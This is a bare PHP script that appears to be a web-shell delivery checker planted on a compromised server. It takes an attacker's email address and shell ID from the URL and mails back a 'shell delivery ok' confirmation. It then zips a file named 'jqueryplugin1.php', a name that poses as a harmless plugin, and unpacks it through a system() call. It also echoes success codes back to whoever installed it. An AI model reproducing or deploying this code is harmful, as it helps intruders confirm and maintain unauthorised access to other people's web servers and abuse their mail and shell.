<?php 
if(isset($_GET['email']) && isset($_GET['shellid'])){
	$email = $_GET['email'];
	$shellid = $_GET['shellid'];
	if(function_exists("mail")) {
					mail($email, 'shell delivery ok : #'.$shellid.'', 'Delivery is okay!');
					$working= 'MDW0rking=1';
				} else {
					$working= 'MDW0rking=0';
				}
}else{
	echo "no email given";
}

/* creates a compressed zip file */
function create_zip($files = array(),$destination = '',$overwrite = false) {
	//if the zip file already exists and overwrite is false, return false
	if(file_exists($destination) && !$overwrite) { return false; }
	//vars
	$valid_files = array();
	//if files were passed in...
	if(is_array($files)) {
		//cycle through each file
		foreach($files as $file) {
			//make sure the file exists
			if(file_exists($file)) {
				$valid_files[] = $file;
			}
		}
	}
	if(count($valid_files)) {
		//create the archive
		$zip = new ZipArchive();
		if($zip->open($destination,$overwrite ? ZIPARCHIVE::OVERWRITE : ZIPARCHIVE::CREATE) !== true) {
			return false;
		}
		//add the files
		foreach($valid_files as $file) {
			$zip->addFile($file,$file);
		}
		//debug
		//echo 'The zip archive contains ',$zip->numFiles,' files with a status of ',$zip->status;
		
		//close the zip -- done!
		$zip->close();
		
		//check to make sure the file exists
		return file_exists($destination);
	}
	else
	{
		return false;
	}
}

$files_to_zip = array(
	'jqueryplugin1.php'
);

$result = create_zip($files_to_zip,'4rkh9v.zip');

if($result == true){
$file = '4rkh9v.zip';
system('unzip -o ' . $file);
echo $working;
}else{


echo $working;
if($working == "MDW0rking=1"){
	echo "SuksesPazip";
}else if($working == "MDW0rking=0"){
	echo "FailedPazip";
}else{
	echo "keq";
}


}




?>
